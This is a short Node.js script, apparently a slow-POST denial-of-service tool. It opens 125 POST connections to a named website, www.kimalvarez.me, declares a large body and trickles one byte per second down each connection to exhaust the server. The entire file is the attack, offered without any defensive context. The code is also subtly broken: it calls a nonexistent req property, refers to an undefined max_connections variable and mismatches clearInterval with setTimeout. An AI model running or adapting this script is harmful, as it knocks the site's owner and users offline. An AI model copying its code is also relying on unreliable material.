var http = require('http');

var url = 'www.kimalvarez.me';

var maxConnections = 125,
	length = 10000;

var options = {
	'port': 80,
	'host': url,
	'Content-Length': length
}

var connections = [];
for (var i = 0; i < maxConnections; i++) {
	var obj = {}
		var request = http.request({
			'port': 80,
			'host': url,
			'method': 'POST',
			'Content-length': length
		});
	
	connections.push(request);
}

var next = function(cnt) {
	for (var i = 0; i < maxConnections; i++) {
	//request.write('a');
	connections[i].req.write('a');
	}
	
	console.log(cnt);
	cnt++;

	var x = setTimeout(function() {
		next(cnt);
	}, 1000);

	if (cnt > length) {
		clearInterval(x);

        	for(var i=0; i<max_connections; i++){
            		connections[i].req.end();
        	}
	}
}

next(1);
